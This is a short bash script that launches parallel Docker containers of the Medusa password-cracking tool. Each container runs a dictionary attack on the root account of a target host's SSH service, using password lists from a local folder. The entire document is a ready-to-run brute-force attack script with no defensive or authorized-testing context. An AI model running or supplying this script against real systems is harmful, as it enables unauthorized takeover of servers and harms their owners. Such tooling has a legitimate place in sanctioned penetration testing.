#!/bin/bash
NUM=0
TARGET=$1

echo "crack $TARGET"

for PASSWD_FILE in `ls ~/vol/medusa`
do
    ((NUM++))
    echo "Run docker crack_$NUM"
    docker run -d --name crack_$NUM -v ~/vol/medusa/$PASSWD_FILE:/data/passwd.txt playniuniu/medusa ./medusa -h $TARGET -u root -P /data/passwd.txt -f -M ss
h
done
